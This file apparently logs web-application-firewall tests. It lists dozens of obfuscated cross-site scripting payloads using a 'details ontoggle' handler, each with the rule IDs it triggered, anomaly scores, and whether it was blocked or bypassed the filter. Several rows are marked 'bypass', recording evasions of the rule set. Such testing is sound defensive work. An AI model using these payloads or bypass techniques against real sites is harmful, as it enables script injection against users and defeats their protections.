441,"<details open ontoggle=""(function(){with(this){isNaN['constructor']('al'+'ert(1)')()}})()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o24,65v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,91 || o25,11v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o41,26v217,91t:urlDecodeUni,t:compressWhitespace || ",30,177826461751.530054
462,"<details open ontoggle=""(new(self.Function)('ale'+'rt(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,37v217,63t:urlDecode,t:replaceComments,t:compressWhitespace || v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,63t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826466238.320243
463,"<details open ontoggle=""(new(top.Function)('al'+'ert(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,36v217,62t:urlDecode,t:replaceComments,t:compressWhitespace || v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,62t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826466479.552790
464,"<details open ontoggle=""(new(parent.Function)('aler'+'t(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,39v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826466613.836537
465,"<details open ontoggle=""(new(window.Function)('ale'+'rt(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,39v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826466834.395585
467,"<details open ontoggle=""(new(this.constructor.constructor)('ale'+'rt(2)'))()"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,52v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || o29,16v217,78 || o29,16v217,78t:urlDecodeUni || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826467296.359235
468,"<details open ontoggle=""(new({}.constructor.constructor)('ale'+'rt(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,50v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826467592.226531
469,"<details open ontoggle=""(new([].constructor.constructor)('ale'+'rt(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,50v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826467778.206507
470,"<details open ontoggle=""(new(1..constructor.constructor)('ale'+'rt(2)'))()"">",0,1,block,4,"933210,941100,941120,949110","o24,50v217,76t:urlDecode,t:replaceComments,t:compressWhitespace || v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,76t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782646793.634007
478,"<details open ontoggle=""(new&#09;Function&#09;('ale'+'rt(2)'))()"">",0,1,bypass,2,"941100,941120","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826469592.094047
479,"<details open ontoggle=""(new&#10;Function&#10;('ale'+'rt(2)'))()"">",0,1,bypass,2,"941100,941120","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826469759.894659
480,"<details open ontoggle=""(new&#13;Function&#13;('ale'+'rt(2)'))()"">",0,1,bypass,2,"941100,941120","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826469976.031915
481,"<details open ontoggle=""(new&#32;Function&#32;('ale'+'rt(2)'))()"">",0,1,bypass,2,"941100,941120","v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,66t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826470297.134520
486,"<details open ontoggle=""[].find['constr'+'uctor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,42v217,78t:urlDecode,t:replaceComments,t:compressWhitespace || v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,78t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826471264.788757
491,"<details open ontoggle=""(Reflect['construc'+'t'](function(){}['con'+'structor'],['al'+'ert(1)'])())""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,75v217,111t:urlDecode,t:replaceComments,t:compressWhitespace || o49,11v217,111 || o49,11v217,111t:urlDecodeUni || v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,111t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826472392.435512
498,"<details open ontoggle=""(async function(){}['constr'+'uctor']('aler'+'t(1)')())""></details>",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,55v217,91t:urlDecode,t:replaceComments,t:compressWhitespace || o31,11v217,91 || o31,11v217,91t:urlDecodeUni || v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,91t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826473840.744328
506,"<details open ontoggle=""top['Function']('return\u0020al'+'ert')()('XSS')""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,45v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,84t:urlDecodeUni,t:compressWhitespace || ",20,177826475571.211507
522,"<details open ontoggle=""(new Function('return al'+'ert')).call()(2)"">",0,1,block,6,"933210,934100,934100,941100,941120,949110","o24,43v217,69t:urlDecode,t:replaceComments,t:compressWhitespace || o25,13v217,69 || o25,13v217,69t:urlDecodeUni || v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,69t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",25,177826478990.733989
535,"<details open ontoggle=""parent['ev'+'al']('ale'+'rt(2)')"">",0,1,block,4,"933210,941100,941120,949110","o30,26v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826481629.833591
542,"<details open ontoggle=""(Function.constructor('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,4,"933210,941100,941120,949110","o24,60v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826483148.217914
544,"<details open ontoggle=""(window['Function']['constructor']('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,5,"933210,941100,941120,941370,949110","o24,73v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,18v217,99t:urlDecodeUni,t:compressWhitespace || ",20,177826483594.665284
553,"<details open ontoggle=""(top['Function']['constructor']('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,5,"933210,941100,941120,941370,949110","o24,70v217,96t:urlDecode,t:replaceComments,t:compressWhitespace || v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,96t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o25,15v217,96t:urlDecodeUni,t:compressWhitespace || ",20,177826485417.456823
555,"<details open ontoggle=""(frames['Function']('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,4,"933210,941100,941120,949110","o24,58v217,84t:urlDecode,t:replaceComments,t:compressWhitespace || v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826485819.934065
559,"<details open ontoggle=""(Function['constructor']('return wind'+'ow.al'+'ert'))()('XSS')"">",0,1,block,4,"933210,941100,941120,949110","o24,63v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826486742.884088
562,"<details open ontoggle=""(Function.prototype.constructor.call(null,atob('YWxlcnQoMSk=')))()"">",0,1,bypass,2,"941100,941120","v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,92t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826487331.737140
568,"<details open ontoggle=""(async function(){}.constructor(String.fromCharCode(97,108,101,114,116,40,49,41)))()"">",0,1,block,4,"934100,941100,941120,949110","o31,11v217,110 || v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,110t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826488645.361299
574,"<details open ontoggle=""(Object.create(Object.getPrototypeOf(function(){})).constructor(String.fromCharCode(97,108,101,114,116,40,49,41)))()"">",0,1,block,4,"934100,941100,941120,949110","o61,11v217,142 || v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,142t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826489926.681614
579,"<details open ontoggle=""(Reflect.construct(Function,[String.fromCharCode(97,108,101,114,116,40,49,41)]))()"">",0,1,block,4,"934100,941100,941120,949110","o53,19v217,108 || v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,108t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782649094.787943
580,"<details open ontoggle=""(Reflect.apply(Function.prototype.constructor,null,[String.fromCharCode(97,108,101,114,116,40,49,41)]))()"">",0,1,block,4,"934100,941100,941120,949110","o76,19v217,131 || v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,131t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826491226.556822
581,"<details open ontoggle=""(Function.prototype.bind.call(Function.prototype.call,Function,null,String.fromCharCode(97,108,101,114,116,40,49,41))())()"">",0,1,block,4,"934100,941100,941120,949110","o92,19v217,148 || v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,148t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826491460.899634
584,"<details open ontoggle=""[]['constructor']['constructor']('ale'+'rt(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o24,49v217,75t:urlDecode,t:replaceComments,t:compressWhitespace || v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,75t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826492083.260040
586,"<details open ontoggle=""top['Function']['call'](null,'ale'+'rt'+String.fromCharCode(40)+'1)')()"">",0,1,block,7,"933210,934100,934100,941100,941120,941370,949110","o27,68v217,97t:urlDecode,t:replaceComments,t:compressWhitespace || o64,19v217,97 || o64,19v217,97t:urlDecodeUni || v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,97t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,97t:urlDecodeUni,t:compressWhitespace || ",30,177826492437.695280
587,"<details open ontoggle=""Object['constructor']['constructor']('ale'+'rt(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o30,47v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826492610.340057
592,"<details open ontoggle=""window['Function']['prototype']['constructor']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o30,57v217,89t:urlDecode,t:replaceComments,t:compressWhitespace || v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,89t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,89t:urlDecodeUni,t:compressWhitespace || ",20,177826493713.846318
597,"<details open ontoggle=""this['construct'+'or']['construct'+'or']('ale'+'rt(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o28,53v217,83t:urlDecode,t:replaceComments,t:compressWhitespace || v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,83t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,22v217,83t:urlDecodeUni,t:compressWhitespace || ",20,177826494840.132736
601,"<details open ontoggle=""(class{static{window['Funct'+'ion']('ale'+'rt(1)')()}})"">",0,1,block,5,"933210,941100,941120,941370,949110","o24,55v217,81t:urlDecode,t:replaceComments,t:compressWhitespace || v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o38,21v217,81t:urlDecodeUni,t:compressWhitespace || ",20,177826495676.133088
604,"<details open ontoggle=""top['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,50v217,79t:urlDecode,t:replaceComments,t:compressWhitespace || v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,79t:urlDecodeUni,t:compressWhitespace || ",20,177826496326.934002
608,"<details open ontoggle=""globalThis['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o34,50v217,86t:urlDecode,t:replaceComments,t:compressWhitespace || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826497194.444959
612,"<details open ontoggle=""Reflect.get(window,'Function')('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,bypass,2,"941100,941120","v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,94t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826498034.549350
615,"<details open ontoggle=""with(window)Function('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,bypass,2,"941100,941120","v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,84t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826498763.093673
616,"<details open ontoggle=""(function(){return this})()['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,5,"933210,934100,941100,941120,949110","o24,77v217,103t:urlDecode,t:replaceComments,t:compressWhitespace || o25,11v217,103 || v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,103t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826498967.247266
617,"<details open ontoggle=""parent['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o30,50v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826499162.540357
618,"<details open ontoggle=""frames['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o30,50v217,82t:urlDecode,t:replaceComments,t:compressWhitespace || v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,82t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826499353.503907
621,"<details open ontoggle=""document['defaultView']['Function']('&#97;&#108;&#101;&#114;&#116;(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o32,65v217,99t:urlDecode,t:replaceComments,t:compressWhitespace || v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,99t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,23v217,99t:urlDecodeUni,t:compressWhitespace || ",20,17782649995.178071
624,"<details open ontoggle=""top['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,58t:urlDecode,t:replaceComments,t:compressWhitespace || v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,58t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,58t:urlDecodeUni,t:compressWhitespace || ",20,177826500597.802005
625,"<details open ontoggle=""window['Function']('al'+'ert(1)')()"">",0,1,block,5,"933210,941100,941120,941370,949110","o30,29v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,61t:urlDecodeUni,t:compressWhitespace || ",20,177826500821.775957
627,"<details open ontoggle=""parent['Function']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o30,29v217,61t:urlDecode,t:replaceComments,t:compressWhitespace || v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,61t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826501283.977424
635,"<details open ontoggle=""Function(String.fromCharCode(97,108,101,114,116,40,49,41))()"">",0,1,block,4,"934100,941100,941120,949110","o33,19v217,86 || v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,86t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826502812.745023
637,"<details open ontoggle=""globalThis['Function']('al'+'ert(1)')()"">",0,1,block,4,"933210,941100,941120,949110","o34,29v217,65t:urlDecode,t:replaceComments,t:compressWhitespace || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,17782650337.071066
639,"<details open ontoggle=""new Function('al'+'ert(1)')()"">",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v216,55 || o24,13v216,55t:urlDecodeUni || v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v216,55t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826503713.757187
645,"<details open ontoggle=""top['Function']('al'+'ert(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o27,29v217,68t:urlDecode,t:replaceComments,t:compressWhitespace || v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,15v217,68t:urlDecodeUni,t:compressWhitespace || ",20,177826504949.441923
658,"<details open ontoggle=""new Function('al'+'ert(1)')()""></details>",0,1,block,5,"934100,934100,941100,941120,949110","o24,13v217,65 || o24,13v217,65t:urlDecodeUni || v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,65t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",20,177826507772.349166
662,"<details open ontoggle=""[].constructor.constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,79t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826508636.796205
666,"<details open ontoggle=""window['Function']('ale'+'rt(1)')()""></details>",0,1,block,5,"933210,941100,941120,941370,949110","o30,29v217,71t:urlDecode,t:replaceComments,t:compressWhitespace || v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o24,18v217,71t:urlDecodeUni,t:compressWhitespace || ",20,177826509468.982753
670,"<details open ontoggle=""globalThis.Function('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,72t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826510262.141423
671,"<details open ontoggle=""Reflect.construct(Function,['ale'+'rt(1)'])()""></details>",0,1,bypass,2,"941100,941120","v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,81t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826510586.389146
672,"<details open ontoggle=""[]['constructor']['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o24,49v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826510713.773920
673,"<details open ontoggle=""(new/**/Function('ale'+'rt(1)'))()""></details>",0,1,bypass,2,"941100,941120","v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,70t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826510961.078843
675,"<details open ontoggle=""''['constructor']['constructor']('ale'+'rt(1)')()""></details>",0,1,block,4,"933210,941100,941120,949110","o26,47v217,85t:urlDecode,t:replaceComments,t:compressWhitespace || v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,85t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || ",15,177826511329.819854
677,"<details open ontoggle=""parent.Function('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,68t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826511757.524629
678,"<details open ontoggle=""top.Function.prototype.constructor('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,87t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826512030.043874
680,"<details open ontoggle=""with(this)Function('ale'+'rt(1)')()""></details>",0,1,bypass,2,"941100,941120","v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls || o13,10v217,71t:utf8toUnicode,t:urlDecodeUni,t:htmlEntityDecode,t:jsDecode,t:cssDecode,t:removeNulls",0,177826512416.590889
